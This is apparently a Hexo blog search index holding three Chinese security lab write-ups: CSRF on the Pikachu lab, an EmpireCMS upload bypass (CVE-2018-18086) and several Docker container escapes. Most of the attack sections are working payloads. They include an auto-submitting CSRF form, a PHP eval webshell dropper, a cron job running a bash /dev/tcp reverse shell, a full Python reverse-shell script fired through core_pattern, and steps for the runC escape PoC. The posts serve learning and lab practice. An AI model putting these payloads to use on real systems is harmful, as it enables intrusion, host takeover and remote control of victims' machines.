<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CSRF漏洞</title>
    <url>/2023/04/14/CSRF%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>在CSRF场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后去欺骗用户点击，一旦点击了之后，攻击完成</p>
<p>他虽然与XSS类似但是不是一个概念</p>
<p>XSS时盗取用户权限来进行攻击的</p>
<p>而CSRF是利用用户已经进入的权限进行攻击的</p>
<h2 id="CSRF类型"><a href="#CSRF类型" class="headerlink" title="CSRF类型"></a>CSRF类型</h2><h6 id="get请求型"><a href="#get请求型" class="headerlink" title="get请求型"></a>get请求型</h6><p>只需要构造一个URL，然后诱骗用户访问</p>
<h6 id="POST请求型"><a href="#POST请求型" class="headerlink" title="POST请求型"></a>POST请求型</h6><p>构造自动提交的表单，诱导用户访问或者点击</p>
<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>一句话就能概括：就是盗用受害者的身份，利用他的权限，他能干啥攻击者就能干啥</p>
<h2 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h2><p>寻找有权限进行增删改查的功能点：修改密码啥的，然后利用不让burpsuite构造HTML修改这些表单中的某些参数</p>
<h2 id="CSRF漏洞挖掘"><a href="#CSRF漏洞挖掘" class="headerlink" title="CSRF漏洞挖掘"></a>CSRF漏洞挖掘</h2><p>一般来说抓取一个正常的请求包，如果没有referer字段和token的话那么极有可能会存在CSRF漏洞</p>
<p>由referer字段，去掉这个字段后再次提交，如果还有效，那么基本上确定由CSRF漏洞了</p>
<p>可以利用工具进行CSRF检测。如：CSRFTESTER，CSRF REQUEST BUILDER等<br>使用burpsuite快速生成CSRF poc</p>
<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><p>可以使用burpsuite里面的engagement tools中的generate CSRF POC模块</p>
<p>前提用户已经登入系统</p>
<p>修改信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230414170737994.png"
                      alt="image-20230414170737994"
                ></p>
<p>点击submit抓包</p>
<p>抓到数据包之后</p>
<p>在proxy模块右键找到engagement tools中的generate CSRF POC即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230414170158361.png"
                      alt="image-20230414170158361"
                ></p>
<p>然后点击test in browser（这个一般是用于本地的测试），复制url</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230414170544874.png"
                      alt="image-20230414170544874"
                ></p>
<p>在代理浏览器上访问</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230414170907401.png"
                      alt="image-20230414170907401"
                ></p>
<p>点击submit request即可修改用户信息</p>
<p>远程的是点击copy html</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230414170926390.png"
                      alt="image-20230414170926390"
                ></p>
<p>然后将复制的代码写成一个网页，加入一些具有诱惑性的css界面，即可诱惑他人点击就可以，掌握对方的权限</p>
<p>如</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230414171055022.png"
                      alt="image-20230414171055022"
                ></p>
<h2 id="pikachu靶场演示"><a href="#pikachu靶场演示" class="headerlink" title="pikachu靶场演示"></a>pikachu靶场演示</h2><h6 id="CSRF（get）"><a href="#CSRF（get）" class="headerlink" title="CSRF（get）"></a>CSRF（get）</h6><p>抓包</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230414171242474.png"
                      alt="image-20230414171242474"
                ></p>
<p>然后发现各个数值的值</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230414171341191.png"
                      alt="image-20230414171341191"
                ></p>
<p>复制拼接到url中同时修改数值，将add地址修改为nihao，提交</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230414171519215.png"
                      alt="image-20230414171519215"
                ></p>
<p>成功修改</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230414171611509.png"
                      alt="image-20230414171611509"
                ></p>
<h6 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h6><p>按正常步骤抓包</p>
<p>会发现它没有以字符串的形式传输值</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230414181029205.png"
                      alt="image-20230414181029205"
                ></p>
<p>以post形式请求的需要，将利用该漏洞的html文件，放在自己的服务器上，并且用户要访问这个文件</p>
<p>首先要编写html攻击文件</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;script&gt;                                                                                                       &lt;!-- 这个script是用来自动提交表单的 --&gt;</span><br><span class="line">        window.onload = function() &#123;</span><br><span class="line">        document.getElementById(&quot;submit&quot;).click();</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;              </span><br><span class="line">    &lt;body&gt;</span><br><span class="line">            &lt;form action=&quot;http://127.0.0.1/pikachu-master/vul/csrf/csrfpost/csrf_post_edit.php&quot; method=&quot;POST&quot;&gt;    </span><br><span class="line">                &lt;input type=&quot;hidden&quot; name=&quot;sex&quot; value=&quot;girl&quot; /&gt;</span><br><span class="line">                &lt;input type=&quot;hidden&quot; name=&quot;phonenum&quot; value=&quot;12345678922&quot; /&gt;</span><br><span class="line">                &lt;input type=&quot;hidden&quot; name=&quot;add&quot; value=&quot;usa&quot; /&gt;</span><br><span class="line">                &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;xiannv@pikachu.com&quot; /&gt;</span><br><span class="line">                &lt;input type=&quot;hidden&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">	            &lt;input id=&quot;submit&quot; type=&quot;submit&quot; value=&quot;Submit request&quot; style=&quot;display:none&quot;/&gt;                    &lt;!-- style设置为display:none起到隐藏submit按钮的作用 --&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt; </span><br><span class="line"></span><br><span class="line">保存为post.html文件</span><br></pre></td></tr></table></figure></div>

<p>在攻击机上开一个http服务</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure></div>

<p>再将链接发送给对方</p>
<p>访问即可</p>
<h6 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF(Token)"></a>CSRF(Token)</h6><p>这是一个CSRF防范的一种方法利用Token值进行验证</p>
<p>抓包发现具有Token</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230414172344136.png"
                      alt="image-20230414172344136"
                ></p>
<p>我们尝试删除token值看看能不能绕过</p>
<p>把手机号改了，提交</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230414172527433.png"
                      alt="image-20230414172527433"
                ></p>
<p>发现没啥用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230414172714453.png"
                      alt="image-20230414172714453"
                ></p>
<p>参考别人的文章</p>
<p>获取token，再到另一个浏览器上面登入，构造payload包含此token也没啥用</p>
<p>服务器中会比较token字段和session的token字段，相同才会修改用户信息</p>
<p>修改之后会生成一个新的token，返回到html表单中并隐藏起来，用于下次的用户信息修改</p>
<p>并且在生成新token之前会销毁老token避免重复使用</p>
<h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2><h6 id="token随机"><a href="#token随机" class="headerlink" title="token随机"></a>token随机</h6><p>原理是利用这个的随机性来让服务器进行验证，如果没有token或者token不正确则认为可能是CSRF攻击</p>
<h6 id="referer校验"><a href="#referer校验" class="headerlink" title="referer校验"></a>referer校验</h6><p>referer记录了该http请求的来源地址，如果记录的不是同一个浏览器的请求，那可能是攻击者伪造的链接</p>
]]></content>
  </entry>
  <entry>
    <title>CVE2018-18086</title>
    <url>/2024/02/29/CVE2018-18086/</url>
    <content><![CDATA[<p>帝国cms</p>
<p>上传文件发现有限制只能是.mod结尾的文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325220301053.png"
                      alt="image-20230325220301053"
                ></p>
<p>分析源码发现它将上传的文件以时间进行加密重命名</p>
<p>并且下面的是直接将文件包含调用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img2018.cnblogs.com/blog/1592114/201908/1592114-20190815190354622-1411694951.png"
                      alt="img"
                ></p>
<p>所以可以直接在上传的文件中写入，创造新文件的代码</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php file_put_contents(&quot;get.php&quot;,&quot;&lt;?php @eval(\$_POST[cmd]); ?&gt;&quot;);?&gt;</span><br></pre></td></tr></table></figure></div>

<p>表示构造一个新文件，名为get.php内容是一句话木马，这样就饶过了重命名验证，然后用蚁剑连一下就可以获取到flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325220902059.png"
                      alt="image-20230325220902059"
                ></p>
]]></content>
  </entry>
  <entry>
    <title>Docker逃逸</title>
    <url>/2024/02/29/Docker%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<h1 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h1><h2 id="docker容器"><a href="#docker容器" class="headerlink" title="docker容器"></a>docker容器</h2><p>docker容器本质上就是机器上的沙盒进程，他和主机上的所有其他进程隔离，可以理解为容器只是操作系统中被隔离开来的进程</p>
<p>在容器中运行的依赖文件就是镜像，可以通过镜像来创建多个容器</p>
<h2 id="docker的基本语法指令"><a href="#docker的基本语法指令" class="headerlink" title="docker的基本语法指令"></a>docker的基本语法指令</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps                      #获取到容器的id</span><br><span class="line">docker stop 容器id             #通过id停止一个容器</span><br><span class="line">docker rm 容器id               #容器停止后，删除一个容器</span><br><span class="line">docker rm -f 容器id -f         #-f即force，表示强制删除</span><br><span class="line">docker pull 镜像名             #拉取镜像</span><br><span class="line">docker logs -f 容器id          #查看容器运行日志</span><br><span class="line">docker exec -it 容器id bash    #表示进入当前容器的shell</span><br><span class="line">docker run .......            #通过run创建一个新的容器</span><br></pre></td></tr></table></figure></div>



<h2 id="docker判断"><a href="#docker判断" class="headerlink" title="docker判断"></a>docker判断</h2><p>获取一个权限之后要判断是否是docker环境</p>
<p>1、可以判断根目录的.dockerenv文件</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /.dockerenv</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231008225514806.png"
                      alt="image-20231008225514806"
                ></p>
<p>2、查看cgroup是否存在docker字符</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /proc/1/cgroup</span><br><span class="line">cat /proc/self/cgroup</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231008225553009.png"
                      alt="image-20231008225553009"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231008225658018.png"
                      alt="image-20231008225658018"
                ></p>
<h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>直接使用vulhub的环境，启动环境</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd vulhub-master/docker/unauthorized-rce</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231008165213989.png"
                      alt="image-20231008165213989"
                ></p>
<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>存在未授权接口泄露</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.81.132:2375/info</span><br><span class="line">http://192.168.81.132:2375/version</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231008165522779.png"
                      alt="image-20231008165522779"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231008165504787.png"
                      alt="image-20231008165504787"
                ></p>
<p>则说明漏洞存在</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>利用端口未授权，可以远程查看docker的情况并且操作docker</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231008171002312.png"
                      alt="image-20231008171002312"
                ></p>
<p>可以看出目前docker是没有镜像的，为了之后的利用需要拉取一个镜像</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker -H tcp://192.168.81.132:2375 pull alpine</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231008171215671.png"
                      alt="image-20231008171215671"
                ></p>
<p>查看镜像是否pull成功</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker -H tcp://192.168.81.132:2375 images</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231008171311929.png"
                      alt="image-20231008171311929"
                ></p>
<p>需要利用特权方式来启动docker镜像</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker -H tcp://192.168.81.132:2375 run -it --privileged alpine  /bin/sh</span><br></pre></td></tr></table></figure></div>

<p>查看系统的磁盘分区情况</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231008171533366.png"
                      alt="image-20231008171533366"
                ></p>
<p>将宿主机所在磁盘挂载到新建的目录中</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir /test  #创建一个新文件夹</span><br><span class="line">mount /dev/sda5 /test  #挂载</span><br><span class="line">ls test/</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231008171803197.png"
                      alt="image-20231008171803197"
                ></p>
<p>挂载成功</p>
<p>新建一个会话，执行nc监听</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231008172207443.png"
                      alt="image-20231008172207443"
                ></p>
<p>进入这个新的文件夹test</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /test</span><br></pre></td></tr></table></figure></div>

<p>创建一个sh文件用来执行计划任务，计划任务是反弹shell</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">touch /test/test.sh   #创建文件</span><br><span class="line">echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.81.135/9000 0&gt;&amp;1&quot; &gt;/test/test.sh   #将反弹shell指令写入sh文件</span><br><span class="line">echo &quot;* * * * * root bash /test.sh&quot; &gt;&gt; /test/etc/crontab    #写入计划任务</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231008172410765.png"
                      alt="image-20231008172410765"
                ></p>
<p>然后shell得到反弹</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231008172440507.png"
                      alt="image-20231008172440507"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231008172524287.png"
                      alt="image-20231008172524287"
                ></p>
<p>这个未授权其实就是利用未授权可以远程的操作docker，最后利用的也是特权启动的漏洞，所以特权漏洞也是一样的流程</p>
<h2 id="敏感目录挂载"><a href="#敏感目录挂载" class="headerlink" title="敏感目录挂载"></a>敏感目录挂载</h2><p>搭建环境</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">拉取ubuntu16.04的镜像</span><br><span class="line">docker pull ubuntu:16.04</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231008214027356.png"
                      alt="image-20231008214027356"
                ></p>
<p>将宿主机的根目录挂载到docker的test文件夹中</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -itd -v /:/test ubuntu:16.04 /bin/bash</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231008214359651.png"
                      alt="image-20231008214359651"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231008214334328.png"
                      alt="image-20231008214334328"
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -it 418e641a76e8 bash</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231008214717873.png"
                      alt="image-20231008214717873"
                ></p>
<p>挂载成功，然后就跟上面一样就可以写计划任务反弹shell了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231008221653474.png"
                      alt="image-20231008221653474"
                ></p>
<h2 id="挂载docker-socket"><a href="#挂载docker-socket" class="headerlink" title="挂载docker socket"></a>挂载docker socket</h2><p>环境搭建</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">还是利用刚才的ubuntu:16.04环境</span><br><span class="line">docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu:16.04 /bin/bash</span><br><span class="line"></span><br><span class="line">#--rm指的是容器停止后自动删除该容器</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231008223327872.png"
                      alt="image-20231008223327872"
                ></p>
<p>将宿主机的docker.sock挂载到docker中，环境中就是模拟真实情况中的将宿主机的这个文件放到dockers中</p>
<p>docker.sock这个文件挂载到docker中会导致docker环境中也会具有操作宿主机docker的权限</p>
<p>然后就可以利用以下命令来执行系统docker的命令</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcp://host:port</span><br><span class="line">unix:///var/run/docker.sock</span><br><span class="line">fd://socketfd</span><br></pre></td></tr></table></figure></div>

<h4 id="漏洞验证-1"><a href="#漏洞验证-1" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><p>在docker中存在docker.sock这个文件就说明存在漏洞，说明这个文件被挂载到docker中了</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -name docker.sock</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231008223919997.png"
                      alt="image-20231008223919997"
                ></p>
<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>如果具有以上文件的话就具有该漏洞</p>
<p>可以利用命令查看宿主机的docker镜像</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker -H unix://var/run/docker.sock images </span><br></pre></td></tr></table></figure></div>

<p>但是在此之前得在docker容器中安装docker</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get upgrade</span><br><span class="line">apt-get install docker.io</span><br></pre></td></tr></table></figure></div>

<p>然后就可以执行相关docker操作</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker -H unix://var/run/docker.sock images </span><br><span class="line">docker -H unix://var/run/docker.sock ps</span><br><span class="line">docker -H unix://var/run/docker.sock run -v /:/test -it ubuntu:16.04 /bin/bash ls /test</span><br></pre></td></tr></table></figure></div>

<p>剩下的思路就是在docker中再创建一个docker容器，然后挂载，在这个新的docker容器中实现计划任务shell反弹，一样的道理</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker -H unix://var/run/docker.sock run -v /:/test -it ubuntu:16.04 /bin/bash</span><br><span class="line">ls /test</span><br></pre></td></tr></table></figure></div>







<h2 id="挂载宿主机procfs逃逸"><a href="#挂载宿主机procfs逃逸" class="headerlink" title="挂载宿主机procfs逃逸"></a>挂载宿主机procfs逃逸</h2><p>查找docker容器在宿主机下的绝对路径</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /proc/mounts | grep docker</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231011101412850.png"
                      alt="image-20231011101412850"
                ></p>
<p>workdir就是代表这个docker容器在宿主机中的绝对路径</p>
<p>当启动一个容器时，会在<code>/var/lib/docker/overlay2</code>目录下生成一层容器层，容器层里面包括<code>diff、link、lower、merged、work</code>目录，而<code>docker</code>容器的目录保存在<code>merged</code>目录中</p>
<p>这样的形式可以利用一种叫挂载宿主机procfs的逃逸方式</p>
<p>利用的是<code>procfs</code>中的<code>/proc/sys/kernel/core_pattern</code>负责配置进程崩溃时内存转储数据的导出方式，如果<code>/proc/sys/kernel/core_pattern</code>文件中的首个字符是管道符<code>|</code> ，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行</p>
<p>需要程序奔溃才能触发，条件苛刻.</p>
<p>但主要思路就是挂载宿主机的文件，修改docker中文件达到修改宿主机的文件</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu:16.04</span><br></pre></td></tr></table></figure></div>

<p>创建一个反弹脚本用于之后运行反弹shell</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /tmp/.t.py</span><br><span class="line"></span><br><span class="line">#!/usr/bin/python3</span><br><span class="line">import  os</span><br><span class="line">import pty</span><br><span class="line">import socket</span><br><span class="line">lhost = &quot;192.168.59.145&quot;</span><br><span class="line">lport = 6666</span><br><span class="line">def main():</span><br><span class="line">   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">   s.connect((lhost, lport))</span><br><span class="line">   os.dup2(s.fileno(), 0)</span><br><span class="line">   os.dup2(s.fileno(), 1)</span><br><span class="line">   os.dup2(s.fileno(), 2)</span><br><span class="line">   os.putenv(&quot;HISTFILE&quot;, &#x27;/dev/null&#x27;)</span><br><span class="line">   pty.spawn(&quot;/bin/bash&quot;)</span><br><span class="line">   # os.remove(&#x27;/tmp/.t.py&#x27;)</span><br><span class="line">   s.close()</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">   main()</span><br></pre></td></tr></table></figure></div>

<p>然后输出一个|开头的一串字符会导致后面的以脚本解释</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 777 /tmp/.t.py</span><br><span class="line">echo -e &quot;|//var/lib/docker/overlay2/559aa75e1fbf3659f9f229f5d7e7e6c4ce4ec1cb2a8c42d3d07476c42148a567/merged/tmp/.t.py \rcore    &quot; &gt;  /host/proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure></div>

<p>然后kali监听，容器中创建一个可以奔溃的程序，编译运行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim t.c</span><br><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main(void)  &#123;</span><br><span class="line">   int *a  = NULL;</span><br><span class="line">   *a = 1;</span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gcc t.c -o t</span><br><span class="line">./t</span><br></pre></td></tr></table></figure></div>

<p>然后就能收到反弹</p>
<h2 id="runC容器逃逸"><a href="#runC容器逃逸" class="headerlink" title="runC容器逃逸"></a>runC容器逃逸</h2><p>这个漏洞是由于默认设置下运行的docker容器，可以获得到宿主机的root权限</p>
<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>docker&lt;&#x3D;18.09.2</p>
<p>RunC&lt;&#x3D;1.0-rc6</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>下载exp，传到kali进行修改编译</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/Frichetten/CVE-2019-5736-PoC</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231011105448271.png"
                      alt="image-20231011105448271"
                ></p>
<p>下载一个main.go文件，</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim main.go</span><br></pre></td></tr></table></figure></div>

<p>改掉这个加个反弹shell命令</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231011105607733.png"
                      alt="image-20231011105607733"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231011105829346.png"
                      alt="image-20231011105829346"
                ></p>
<p>之后编译运行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</span><br></pre></td></tr></table></figure></div>

<p>编译完之后会多出几个文件，选择main编译过后的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231011110431544.png"
                      alt="image-20231011110431544"
                ></p>
<p>然后复制到docker中的&#x2F;tmp目录</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231011111107421.png"
                      alt="image-20231011111107421"
                ></p>
<p>kali设置反弹</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 6000</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231011112258855.png"
                      alt="image-20231011112258855"
                ></p>
